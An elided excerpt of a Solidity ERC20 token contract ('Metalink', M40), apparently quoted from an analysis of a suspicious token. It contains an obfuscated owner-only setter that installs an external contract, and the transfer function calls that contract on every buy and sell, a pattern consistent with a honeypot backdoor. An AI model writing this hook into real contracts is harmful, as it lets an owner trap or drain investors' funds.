...
contract TokenM is ERC20 {
    ...
    IUserAmountpojikm public pojikm;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Metalink", "M40") {
    ...
    function ctuopersBuimnsRgge(IUserAmountpojikm _pojikm) public onlyOwner {
        pojikm = _pojikm;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                pojikm.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				pojikm.addOutAmount(from, amount);
            }else{
                pojikm.addOutAmount(from, amount);
                takeFee = false;
            }
